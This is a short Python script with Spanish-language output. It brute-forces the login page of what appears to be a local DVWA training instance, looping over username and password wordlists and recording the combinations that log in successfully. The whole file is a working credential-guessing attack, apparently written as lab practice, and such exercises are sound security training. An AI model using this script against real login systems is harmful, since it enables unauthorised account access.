import requests

url = "http://localhost:4280/vulnerabilities/brute/"

cookies = {
    "PHPSESSID": "607f4ee1c3043680f58b327f39c950c6",
    "security": "low"
}

with open("2024-197_most_used_passwords.txt") as f:
    contrasenas = [line.strip() for line in f]

with open("top-usernames-shortlist.txt") as f:
    usuarios = [line.strip() for line in f]

pares_validos = []

for usuario in usuarios:
    for contrasena in contrasenas:
        params = {"username": usuario,"password": contrasena,"Login": "Login"}
        response = requests.get(url, params=params, cookies=cookies)
        if "Username and/or password incorrect." not in response.text:
            pares_validos.append((usuario, contrasena))

if pares_validos:
    print("Combinaciones válidas encontradas:")
    for usuario, contrasena in pares_validos:
        print(f"Usuario: {usuario}, Contraseña: {contrasena}")
else:
    print("Ninguna combinación fue exitosa.")
